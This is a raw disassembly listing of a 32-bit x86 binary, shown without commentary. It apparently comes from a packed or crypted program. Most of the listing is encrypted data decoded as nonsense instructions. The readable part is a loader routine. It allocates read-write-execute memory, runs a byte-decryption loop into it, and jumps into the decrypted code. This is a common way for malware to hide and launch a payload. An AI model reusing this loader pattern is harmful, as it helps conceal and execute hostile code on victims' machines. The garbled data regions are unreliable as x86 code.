  421363:	xor    al,dh
  421365:	das    
  421366:	jmp    0x421338
  421368:	pop    esp
  421369:	adc    eax,0x7c172328
  42136e:	stc    
  42136f:	mov    ebp,DWORD PTR [eax+0x27]
  421372:	das    
  421373:	(bad)  
  421374:	clc    
  421375:	test   BYTE PTR [ebx-0x35de23ae],bh
  42137b:	pusha  
  42137c:	out    dx,eax
  42137d:	mov    ebp,0x22988c06
  421382:	mov    ah,0x13
  421384:	arpl   WORD PTR [ecx+eax*2],dx
  421387:	cmp    DWORD PTR [ebp-0x59],edx
  42138a:	(bad)  
  42138b:	call   0x1167:0x92e19fd2
  421392:	out    0x68,al
  421394:	das    
  421395:	das    
  421396:	xchg   ebx,eax
  421397:	mov    ch,0x11
  421399:	xchg   ecx,eax
  42139a:	add    eax,0x423f790d
  42139f:	push   ebx
  4213a0:	loopne 0x4213ce
  4213a2:	fiadd  DWORD PTR [esi+ecx*4]
  4213a5:	in     eax,0x31
  4213a7:	push   ecx
  4213a8:	push   es
  4213a9:	mov    ebx,0x93bf7d8c
  4213ae:	xchg   ebx,eax
  4213af:	mov    ?,WORD PTR [esi+0x76]
  4213b2:	push   eax
  4213b3:	sub    eax,0xb487c76d
  4213b8:	bound  esi,QWORD PTR [eax-0x4528f175]
  4213be:	int3   
  4213bf:	jno    0x4213d4
  4213c1:	lods   eax,DWORD PTR ds:[esi]
  4213c2:	test   eax,0xda0f598d
  4213c7:	sbb    eax,0xbe4b9461
  4213cc:	sti    
  4213cd:	sub    al,0x69
  4213cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213d0:	jbe    0x42144f
  4213d2:	dec    ecx
  4213d3:	dec    ebx
  4213d4:	stos   DWORD PTR es:[edi],eax
  4213d5:	mov    esp,DWORD PTR [eax-0x40]
  4213d8:	out    0x9,al
  4213da:	cmp    al,0x4d
  4213dc:	sahf   
  4213dd:	push   0xb5a412e2
  4213e2:	inc    eax
  4213e3:	out    dx,al
  4213e4:	jecxz  0x421370
  4213e6:	stos   DWORD PTR es:[edi],eax
  4213e7:	lds    edi,FWORD PTR [ecx+0x74]
  4213ea:	outs   dx,DWORD PTR ds:[esi]
  4213eb:	inc    ebp
  4213ec:	inc    eax
  4213ed:	fcomip st,st(7)
  4213ef:	fst    DWORD PTR ds:0xe9a432a9
  4213f5:	cld    
  4213f6:	ror    edx,0x61
  4213f9:	cld    
  4213fa:	cli    
  4213fb:	push   ebp
  4213fc:	dec    ebx
  4213fd:	(bad)  
  4213fe:	out    dx,al
  4213ff:	pop    ss
  421400:	mov    esp,0xef49b9ef
  421405:	ins    DWORD PTR es:[edi],dx
  421406:	inc    edi
  421407:	(bad)  
  421408:	pop    ebp
  421409:	out    dx,eax
  42140a:	pusha  
  42140b:	fs push es
  42140d:	into   
  42140e:	gs pop ds
  421410:	adc    al,0x10
  421412:	fld    TBYTE PTR [edx-0x44]
  421415:	or     dh,bl
  421417:	fimul  DWORD PTR [ecx-0x147906a2]
  42141d:	sbb    al,0x58
  42141f:	mov    ah,0x6c
  421421:	cmp    eax,0xb924a249
  421426:	mov    cl,BYTE PTR [edi+edi*2-0x7b]
  42142a:	not    DWORD PTR [edx-0x2e96a943]
  421430:	pop    esp
  421431:	mov    cs,ebp
  421433:	(bad)  
  421434:	ins    BYTE PTR es:[edi],dx
  421435:	mov    dl,0x4c
  421437:	das    
  421438:	push   edx
  421439:	cmp    ebx,DWORD PTR [ecx-0x18]
  42143c:	push   cs
  42143d:	jne    0x421455
  42143f:	xor    al,0x35
  421441:	dec    eax
  421442:	sub    esi,DWORD PTR [edi-0x20]
  421445:	test   eax,0x915a882f
  42144a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42144b:	and    al,0xe6
  42144d:	mov    esi,DWORD PTR ds:0x7a8af4c7
  421453:	dec    edx
  421454:	mov    eax,edx
  421456:	mov    al,0xbd
  421458:	retf   
  421459:	in     al,0xb9
  42145b:	pop    edi
  42145c:	adc    al,0x30
  42145e:	arpl   WORD PTR [ebx+0x105db09d],sp
  421464:	rcl    BYTE PTR [esi-0x6a],0x20
  421468:	inc    esp
  421469:	or     al,0x72
  42146b:	pop    ecx
  42146c:	sahf   
  42146d:	lods   al,BYTE PTR ds:[esi]
  42146e:	mov    ?,WORD PTR ds:0xa1835ff3
  421474:	test   al,0x28
  421476:	out    dx,eax
  421477:	xor    ebp,esp
  421479:	ret    
  42147a:	cdq    
  42147b:	mov    ds:0xd4215c34,al
  421480:	jae    0x4214dd
  421482:	aaa    
  421483:	push   esp
  421484:	mov    ch,0x8f
  421486:	fadd   QWORD PTR cs:0xa6883366
  42148d:	dec    edi
  42148e:	mov    BYTE PTR [edx+0x5e],dl
  421491:	lock and BYTE PTR [edx+0x27],dl
  421495:	cli    
  421496:	pop    ecx
  421497:	push   cs
  421498:	xchg   edi,eax
  421499:	lods   eax,DWORD PTR ds:[esi]
  42149a:	out    0xf6,al
  42149c:	outs   dx,DWORD PTR ds:[esi]
  42149d:	fldenv [edx]
  42149f:	cmp    ch,0x6e
  4214a2:	aaa    
  4214a3:	rcl    DWORD PTR [eax+0x34789194],0xa1
  4214aa:	adc    al,0x78
  4214ac:	fsubr  QWORD PTR [eax+0x5ea4c40a]
  4214b2:	jb     0x4214b0
  4214b4:	add    esi,DWORD PTR [esi+eiz*1+0x66]
  4214b8:	xor    DWORD PTR [ebx+0x1c90acbb],esp
  4214be:	xchg   edi,eax
  4214bf:	inc    edx
  4214c0:	inc    ebx
  4214c1:	pop    esp
  4214c2:	pusha  
  4214c3:	sub    ebp,esp
  4214c5:	inc    edx
  4214c6:	mov    ch,0x62
  4214c8:	das    
  4214c9:	xor    eax,eax
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428100
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x428104
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428108
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x42810c
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f0
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280f4
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x4280f8
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x4280fc
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x4280fe
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	cmp    DWORD PTR [ebp+0x8],0x0
  421630:	jne    0x42163b
  421632:	mov    eax,DWORD PTR [ebp-0x10]
  421635:	add    eax,0x1
  421638:	mov    DWORD PTR [ebp-0x10],eax
  42163b:	mov    DWORD PTR [ebp-0x48],0x0
  421642:	mov    DWORD PTR [ebp-0x4c],0x0
  421649:	push   0x1
  42164b:	lea    ecx,[ebp-0x14]
  42164e:	push   ecx
  42164f:	call   DWORD PTR ds:0x428000
  421655:	mov    BYTE PTR [ebp-0x40],0x56
  421659:	call   DWORD PTR ds:0x428010
  42165f:	mov    DWORD PTR [ebp-0x2c],eax
  421662:	mov    BYTE PTR [ebp-0x3e],0x72
  421666:	movzx  edx,WORD PTR [ebp-0x2c]
  42166a:	test   edx,edx
  42166c:	jne    0x4216ae
  42166e:	mov    BYTE PTR [ebp-0x34],0x0
  421672:	mov    DWORD PTR [ebp-0x14],0xe0d
  421679:	lea    eax,[ebp-0x28]
  42167c:	push   eax
  42167d:	call   DWORD PTR ds:0x428014
  421683:	mov    DWORD PTR [ebp-0x68],eax
  421686:	mov    DWORD PTR [ebp-0x5c],0x3a
  42168d:	lea    ecx,[ebp-0x40]
  421690:	push   ecx
  421691:	mov    edx,DWORD PTR [ebp-0x68]
  421694:	push   edx
  421695:	call   DWORD PTR ds:0x428018
  42169b:	mov    DWORD PTR [ebp-0x44],eax
  42169e:	mov    DWORD PTR [ebp-0x8],0xb31c2c6b
  4216a5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216ac:	jmp    0x4216c3
  4216ae:	mov    BYTE PTR ds:0x443a58,0x0
  4216b5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216bc:	mov    BYTE PTR ds:0x441b18,0x0
  4216c3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216ca:	push   DWORD PTR ds:0x428014
  4216d0:	pop    edx
  4216d1:	mov    DWORD PTR [ebp-0x74],edx
  4216d4:	push   DWORD PTR [ebp-0x30]
  4216d7:	push   0x1000
  4216dc:	mov    eax,DWORD PTR [ebp-0x14]
  4216df:	add    eax,0x23
  4216e2:	add    eax,0x23
  4216e5:	push   eax
  4216e6:	xor    eax,eax
  4216e8:	push   eax
  4216e9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216ec:	call   ecx
  4216ee:	mov    edx,eax
  4216f0:	mov    DWORD PTR [ebp-0x4],edx
  4216f3:	mov    eax,DWORD PTR [ebp-0x70]
  4216f6:	sub    eax,0xdae0b
  4216fb:	mov    DWORD PTR [ebp-0x70],eax
  4216fe:	cmp    DWORD PTR [ebp-0x4],0x0
  421702:	jne    0x42170b
  421704:	mov    BYTE PTR ds:0x441b18,0x0
  42170b:	mov    ecx,DWORD PTR [ebp-0x4]
  42170e:	add    ecx,DWORD PTR [ebp-0x14]
  421711:	mov    edx,DWORD PTR [ebp-0x8]
  421714:	mov    DWORD PTR [ecx],edx
  421716:	mov    eax,DWORD PTR [ebp-0x4]
  421719:	add    eax,DWORD PTR [ebp-0x5c]
  42171c:	mov    DWORD PTR [ebp-0x64],eax
  42171f:	mov    ecx,DWORD PTR ds:0x428018
  421725:	mov    DWORD PTR [ebp-0x54],ecx
  421728:	mov    edx,DWORD PTR [ebp-0x4]
  42172b:	add    edx,DWORD PTR [ebp-0x14]
  42172e:	mov    eax,DWORD PTR [ebp+0x8]
  421731:	mov    DWORD PTR [edx+0x4],eax
  421734:	mov    ecx,DWORD PTR [ebp-0x4]
  421737:	add    ecx,DWORD PTR [ebp-0x14]
  42173a:	mov    DWORD PTR [ebp-0xc],ecx
  42173d:	cmp    DWORD PTR [ebp-0x70],0x0
  421741:	jbe    0x42175e
  421743:	mov    edx,DWORD PTR [ebp-0xc]
  421746:	push   edx
  421747:	mov    eax,DWORD PTR [ebp-0x14]
  42174a:	push   eax
  42174b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42174e:	add    ecx,DWORD PTR [ebp-0x70]
  421751:	push   ecx
  421752:	mov    edx,DWORD PTR [ebp-0x4]
  421755:	push   edx
  421756:	call   0x4214d0
  42175b:	add    esp,0x10
  42175e:	cmp    DWORD PTR [ebp-0x64],0x0
  421762:	je     0x421776
  421764:	mov    ecx,DWORD PTR [ebp-0x54]
  421767:	push   ecx
  421768:	push   DWORD PTR [ebp-0x74]
  42176b:	mov    esi,DWORD PTR [ebp-0x64]
  42176e:	push   edx
  42176f:	pop    eax
  421770:	push   ecx
  421771:	nop
  421772:	jmp    esi
  421774:	jmp    0x42177c
  421776:	mov    eax,DWORD PTR [ebp+0x8]
  421779:	mov    DWORD PTR [ebp-0x18],eax
  42177c:	mov    eax,0x1
  421781:	pop    esi
  421782:	mov    esp,ebp
  421784:	pop    ebp
  421785:	ret    
  421786:	int3   
  421787:	int3   
  421788:	int3   
  421789:	int3   
  42178a:	int3   
  42178b:	int3   
  42178c:	int3   
  42178d:	int3   
  42178e:	int3   
  42178f:	int3   
  421790:	push   ebp
  421791:	mov    ebp,esp
  421793:	sub    esp,0x18
  421796:	lea    eax,[ebp-0x18]
  421799:	push   eax
  42179a:	call   DWORD PTR ds:0x42800c
  4217a0:	cmp    WORD PTR [ebp-0x18],0x0
  4217a5:	je     0x4217e8
  4217a7:	mov    ecx,DWORD PTR ds:0x428010
  4217ad:	push   0x0
  4217af:	push   0xb2
  4217b4:	push   0x82
  4217b9:	push   0x0
  4217bb:	mov    DWORD PTR [ebp-0x4],ecx
  4217be:	call   DWORD PTR ds:0x428008
  4217c4:	push   DWORD PTR [ebp-0x4]
  4217c7:	pop    edx
  4217c8:	call   edx
  4217ca:	push   eax
  4217cb:	pop    DWORD PTR [ebp-0x8]
  4217ce:	push   0x8ba091e3
  4217d3:	call   0x421550
  4217d8:	add    esp,0x4
  4217db:	call   0x411000
  4217e0:	xor    eax,eax
  4217e2:	mov    esp,ebp
  4217e4:	pop    ebp
  4217e5:	ret    0x10
  4217e8:	(bad)  
  4217e9:	cmp    eax,0xcb01a74
  4217ee:	shr    DWORD PTR [edx+0x224a50aa],1
  4217f4:	inc    ecx
  4217f5:	pop    ds
  4217f6:	(bad)  
  4217f7:	mov    cl,BYTE PTR cs:[eax]
  4217fa:	psrlw  mm5,QWORD PTR [edx+0x224a54aa]
  421801:	add    eax,esp
  421803:	jo     0x421833
  421805:	mov    dh,BYTE PTR [eax-0x55552ef1]
  42180b:	push   esp
  42180c:	dec    edx
  42180d:	and    al,BYTE PTR [ecx-0x20]
  421810:	jo     0x421840
  421812:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421818:	push   esp
  421819:	dec    edx
  42181a:	and    al,BYTE PTR [ecx-0x20]
  42181d:	jo     0x42184d
  42181f:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421825:	lods   al,BYTE PTR ds:[esi]
  421826:	dec    edx
  421827:	and    al,BYTE PTR [ecx-0x12]
  42182a:	outs   dx,DWORD PTR ds:[esi]
  42182b:	xchg   esp,eax
  42182c:	test   BYTE PTR [eax-0x74982745],dh
  421832:	in     al,dx
  421833:	dec    ebx
  421834:	outs   dx,BYTE PTR ds:[esi]
  421835:	mov    ecx,es
  421837:	and    al,0x46
  421839:	jecxz  0x4217fe
  42183b:	das    
  42183c:	mov    eax,ds:0x3833c5d8
  421841:	inc    ebx
  421842:	sub    al,0xc0
  421844:	adc    ecx,DWORD PTR [edi-0x1c]
  421847:	fisub  WORD PTR [eax-0x5b]
  42184a:	mov    cl,al
  42184c:	xor    DWORD PTR [edx+0x50],ebp
  42184f:	xor    al,0x8e
  421851:	push   eax
  421852:	inc    edi
  421853:	in     al,0x90
  421855:	dec    ebx
  421856:	sahf   
  421857:	stc    
  421858:	mov    bh,BYTE PTR [ecx]
  42185a:	and    eax,0x7dce2446
  42185f:	and    eax,DWORD PTR [eax-0x552ef06c]
  421865:	stos   BYTE PTR es:[edi],al
  421866:	push   esp
  421867:	dec    edx
  421868:	and    al,BYTE PTR [esi+0x79]
  42186b:	mov    WORD PTR [edi-0x37],?
  42186e:	dec    eax
  42186f:	popf   
  421870:	fucomi st,st(1)
  421872:	push   edx
  421873:	mov    BYTE PTR [eax+0x61],0xb9
  421877:	jb     0x4218f3
  421879:	jbe    0x42186a
  42187b:	mov    esp,0x38528e05
  421880:	pop    esi
  421881:	adc    al,BYTE PTR [edi+0x79]
  421884:	jmp    0xb457:0xba18d6b2
  42188b:	xchg   ebx,eax
  42188c:	mov    al,ds:0x4bb0b23c
  421891:	int3   
  421892:	(bad)  
  421893:	pop    ss
  421894:	xor    dh,0xf7
  421897:	inc    ebx
  421898:	mov    al,ds:0x285bd4e0
  42189d:	or     ebx,DWORD PTR [eax]
  42189f:	loop   0x4218c5
  4218a1:	shl    BYTE PTR [eax],0xe
  4218a4:	fcomi  st,st(2)
  4218a6:	push   edx
  4218a7:	mov    BYTE PTR [eax+0x61],0xb9
  4218ab:	jae    0x421927
  4218ad:	push   es
  4218ae:	jae    0x4218d2
  4218b0:	add    eax,0x5e2a726e
  4218b5:	pop    es
  4218b6:	fcmovbe st,st(3)
  4218b8:	jmp    0x2907:0xbab74b28
  4218bf:	cmp    BYTE PTR [eax+0x4b2a2f0c],ah
  4218c5:	mov    ds:0xe880bc88,al
  4218ca:	push   0xffffffde
  4218cc:	mov    al,ds:0x28d8ace8
  4218d1:	adc    ecx,DWORD PTR [ecx+0x48c94613]
  4218d7:	popf   
  4218d8:	fld    TBYTE PTR [edx+0x224a54aa]
  4218de:	inc    ecx
  4218df:	loopne 0x421951
  4218e1:	jle    0x4218b2
  4218e3:	mov    al,0xf
  4218e5:	popf   
  4218e6:	stos   DWORD PTR es:[edi],eax
  4218e7:	test   al,0x54
  4218e9:	jmp    0x8a2e:0x70af2af2
  4218f0:	mov    al,0xf
  4218f2:	shr    DWORD PTR [edx+0x214ab4aa],1
  4218f8:	inc    eax
  4218f9:	jmp    0x42196c
  4218fb:	and    al,0x8a
  4218fd:	mov    al,0xe1
  4218ff:	aad    0xaa
  421901:	stos   BYTE PTR es:[edi],al
  421902:	call   0xe0833b53
  421907:	jo     0x421937
  421909:	fwait
  42190a:	or     eax,0xbaaad10f
  42190f:	push   esp
  421910:	dec    edx
  421911:	and    al,BYTE PTR [ecx-0x1b]
  421914:	jo     0x421944
  421916:	mov    dh,cl
  421918:	psrlw  mm7,QWORD PTR [edx+0x204a54aa]
  42191f:	inc    ecx
  421920:	loopne 0x421997
  421922:	mov    esi,DWORD PTR cs:[eax-0x55552ef1]
  421929:	push   ecx
  42192a:	dec    edx
  42192b:	and    eax,DWORD PTR [ecx-0x20]
  42192e:	jo     0x42195e
  421930:	mov    dh,BYTE PTR [eax-0x555522a1]
  421936:	push   eax
  421937:	dec    edx
  421938:	and    al,BYTE PTR [eax+0x4]
  42193b:	jne    0x42196b
  42193d:	mov    BYTE PTR [eax-0x5555aef1],dh
  421943:	inc    esp
  421944:	dec    edx
  421945:	and    dl,BYTE PTR [ecx-0x20]
  421948:	jo     0x421978
  42194a:	mov    ah,BYTE PTR [eax-0x55452ef1]
  421950:	push   esp
  421951:	dec    edx
  421952:	and    al,BYTE PTR [ecx-0x20]
  421955:	pusha  
  421956:	mov    dh,BYTE PTR cs:[eax-0x55552ef1]
  42195d:	push   esp
  42195e:	dec    edx
  42195f:	and    al,BYTE PTR [ecx+0x14]
  421962:	dec    ecx
  421963:	and    cl,BYTE PTR [edx-0x552ef327]
  421969:	stos   BYTE PTR es:[edi],al
  42196a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42196b:	inc    ecx
  42196c:	and    cl,BYTE PTR [esi]
  42196e:	test   eax,0xb08a2e70
  421973:	psrlw  mm5,QWORD PTR [edx+0x224a54aa]
  42197a:	inc    ecx
  42197b:	loopne 0x4219ed
  42197d:	mov    dh,BYTE PTR cs:[eax-0x55552ef1]
  421984:	push   esp
  421985:	dec    edx
  421986:	and    al,BYTE PTR [ecx-0x20]
  421989:	jo     0x4219b9
  42198b:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421991:	push   esp
  421992:	dec    edx
  421993:	and    al,BYTE PTR [ecx-0x20]
  421996:	jo     0x4219c6
  421998:	mov    dh,BYTE PTR [eax-0x55552ef1]
  42199e:	push   esp
  42199f:	dec    edx
  4219a0:	and    al,BYTE PTR [ecx-0x20]
  4219a3:	jo     0x4219d3
  4219a5:	mov    dh,BYTE PTR [eax-0x55552ef1]
  4219ab:	push   esp
  4219ac:	dec    edx
  4219ad:	and    al,BYTE PTR [ecx-0x20]
  4219b0:	jo     0x4219e0
  4219b2:	mov    dh,BYTE PTR [eax-0x55552ef1]
  4219b8:	push   esp
  4219b9:	dec    edx
  4219ba:	and    al,BYTE PTR [ecx-0x20]
  4219bd:	jo     0x4219ed
  4219bf:	mov    dh,BYTE PTR [eax-0x55552ef1]
  4219c5:	push   esp
  4219c6:	dec    edx
  4219c7:	and    al,BYTE PTR [ecx-0x20]
  4219ca:	jo     0x4219fa
  4219cc:	mov    dh,BYTE PTR [eax-0x55552ef1]
  4219d2:	push   esp
  4219d3:	dec    edx
  4219d4:	and    al,BYTE PTR [ecx-0x20]
  4219d7:	jo     0x421a07
  4219d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219da:	les    ebp,FWORD PTR [edx-0x57]
  4219dd:	fisubr WORD PTR [edx-0x5eddb5ac]
  4219e3:	jmp    0x421a55
  4219e5:	cs call 0x54ae:0x7ed10fb0
  4219ed:	dec    edx
  4219ee:	es inc ecx
  4219f0:	loopne 0x421a12
  4219f2:	imul   ecx,ecx,0xffffff82
  4219f5:	pop    ebx
  4219f6:	sahf   
  4219f7:	stos   BYTE PTR es:[edi],al
  4219f8:	stos   BYTE PTR es:[edi],al
  4219f9:	push   esp
  4219fa:	dec    edx
  4219fb:	and    al,BYTE PTR [ecx-0x40]
  4219fe:	jo     0x421a2e
  421a00:	push   0xffffff9e
  421a02:	jge    0x4219a6
  421a04:	fmul   st,st(1)
  421a06:	push   esp
  421a07:	dec    edx
  421a08:	and    al,BYTE PTR [ecx-0x80]
  421a0b:	jo     0x421a3b
  421a0d:	mov    al,BYTE PTR [eax+0x4]
  421a10:	shr    DWORD PTR [edx+0x224a54f0],1
  421a16:	cdq    
  421a17:	in     al,0x70
  421a19:	mov    dh,BYTE PTR cs:[eax-0x55552ef1]
  421a20:	push   esp
  421a21:	dec    edx
  421a22:	and    al,BYTE PTR [ecx-0x20]
  421a25:	push   eax
  421a26:	mov    dl,BYTE PTR cs:[eax+0xf]
  421a2a:	shr    DWORD PTR [edx+0x224a54aa],1
  421a30:	inc    ecx
  421a31:	loopne 0x421aa3
  421a33:	mov    dh,BYTE PTR cs:[eax-0x55552ef1]
  421a3a:	push   esp
  421a3b:	dec    edx
  421a3c:	and    al,BYTE PTR [ecx-0x20]
  421a3f:	jo     0x421a6f
  421a41:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421a47:	push   esp
  421a48:	dec    edx
  421a49:	and    al,BYTE PTR [ecx-0x20]
  421a4c:	jo     0x421a7c
  421a4e:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421a54:	push   esp
  421a55:	dec    edx
  421a56:	and    al,BYTE PTR [ecx-0x20]
  421a59:	jo     0x421a89
  421a5b:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421a61:	push   esp
  421a62:	dec    edx
  421a63:	and    al,BYTE PTR [ecx-0x20]
  421a66:	jo     0x421a96
  421a68:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421a6e:	push   esp
  421a6f:	dec    edx
  421a70:	and    al,BYTE PTR [ecx-0x20]
  421a73:	jo     0x421aa3
  421a75:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421a7b:	push   esp
  421a7c:	dec    edx
  421a7d:	and    al,BYTE PTR [ecx-0x20]
  421a80:	jo     0x421ab0
  421a82:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421a88:	push   esp
  421a89:	dec    edx
  421a8a:	and    al,BYTE PTR [ecx-0x20]
  421a8d:	jo     0x421abd
  421a8f:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421a95:	push   esp
  421a96:	dec    edx
  421a97:	and    al,BYTE PTR [ecx-0x20]
  421a9a:	jo     0x421aca
  421a9c:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421aa2:	push   esp
  421aa3:	dec    edx
  421aa4:	and    al,BYTE PTR [ecx-0x20]
  421aa7:	jo     0x421ad7
  421aa9:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421aaf:	push   esp
  421ab0:	dec    edx
  421ab1:	and    al,BYTE PTR [ecx-0x20]
  421ab4:	jo     0x421ae4
  421ab6:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421abc:	push   esp
  421abd:	dec    edx
  421abe:	and    al,BYTE PTR [ecx-0x20]
  421ac1:	jo     0x421af1
  421ac3:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421ac9:	push   esp
  421aca:	dec    edx
  421acb:	and    al,BYTE PTR [ecx-0x20]
  421ace:	jo     0x421afe
  421ad0:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421ad6:	push   esp
  421ad7:	dec    edx
  421ad8:	and    al,BYTE PTR [ecx-0x20]
  421adb:	jo     0x421b0b
  421add:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421ae3:	push   esp
  421ae4:	dec    edx
  421ae5:	and    al,BYTE PTR [ecx-0x20]
  421ae8:	jo     0x421b18
  421aea:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421af0:	push   esp
  421af1:	dec    edx
  421af2:	and    al,BYTE PTR [ecx-0x20]
  421af5:	jo     0x421b25
  421af7:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421afd:	push   esp
  421afe:	dec    edx
  421aff:	and    al,BYTE PTR [ecx-0x20]
  421b02:	jo     0x421b32
  421b04:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421b0a:	push   esp
  421b0b:	dec    edx
  421b0c:	and    al,BYTE PTR [ecx-0x20]
  421b0f:	jo     0x421b3f
  421b11:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421b17:	push   esp
  421b18:	dec    edx
  421b19:	and    al,BYTE PTR [ecx-0x20]
  421b1c:	jo     0x421b4c
  421b1e:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421b24:	push   esp
  421b25:	dec    edx
  421b26:	and    al,BYTE PTR [ecx-0x20]
  421b29:	jo     0x421b59
  421b2b:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421b31:	push   esp
  421b32:	dec    edx
  421b33:	and    al,BYTE PTR [ecx-0x20]
  421b36:	jo     0x421b66
  421b38:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421b3e:	push   esp
  421b3f:	dec    edx
  421b40:	and    al,BYTE PTR [ecx-0x20]
  421b43:	jo     0x421b73
  421b45:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421b4b:	push   esp
  421b4c:	dec    edx
  421b4d:	and    al,BYTE PTR [ecx-0x20]
  421b50:	jo     0x421b80
  421b52:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421b58:	push   esp
  421b59:	dec    edx
  421b5a:	and    al,BYTE PTR [ecx-0x20]
  421b5d:	jo     0x421b8d
  421b5f:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421b65:	push   esp
  421b66:	dec    edx
  421b67:	and    al,BYTE PTR [ecx-0x20]
  421b6a:	jo     0x421b9a
  421b6c:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421b72:	push   esp
  421b73:	dec    edx
  421b74:	and    al,BYTE PTR [ecx-0x20]
  421b77:	jo     0x421ba7
  421b79:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421b7f:	push   esp
  421b80:	dec    edx
  421b81:	and    al,BYTE PTR [ecx-0x20]
  421b84:	jo     0x421bb4
  421b86:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421b8c:	push   esp
  421b8d:	dec    edx
  421b8e:	and    al,BYTE PTR [ecx-0x20]
  421b91:	jo     0x421bc1
